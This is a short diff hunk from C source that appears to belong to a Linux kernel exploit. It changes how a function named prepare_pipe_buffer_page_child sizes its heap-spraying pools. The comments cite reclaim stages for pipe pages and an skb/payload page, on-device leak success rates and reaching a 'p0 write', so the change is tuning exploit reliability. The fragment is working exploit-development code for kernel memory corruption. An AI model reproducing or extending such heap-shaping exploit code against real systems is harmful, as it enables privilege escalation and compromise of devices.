@@ -147,13 +147,10 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   struct mm_ctx spray;
   struct mm_ctx pre;
   struct mm_ctx post;
-  /*
-   * Keep the heap-shaping pool sized by ORDER3_SIZE (32K slabs) so the two
-   * reclaim stages (p0 pipe pages and the skb/payload page) draw from the
-   * same large pool of freed mm pages; MM_SLAB_ORDER only governs the
-   * bruteforce candidate grid in kernelsnitch_setup.
-   */
-  size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
+  /* Heap-shaping pool sized by the mm slab order (MM_SLAB_ORDER).  The
+   * ORDER3_SIZE (34 objects/slab) pool regressed the on-device leaks
+   * (stage-1 1/5, stage-2 fail); the small pool reached the p0 write. */
+  size_t objs_per_slab = (PAGE_SIZE << MM_SLAB_ORDER) / MM_STRUCT_SZ;
 
   init_ctx(&prep, 32 * objs_per_slab);
   init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
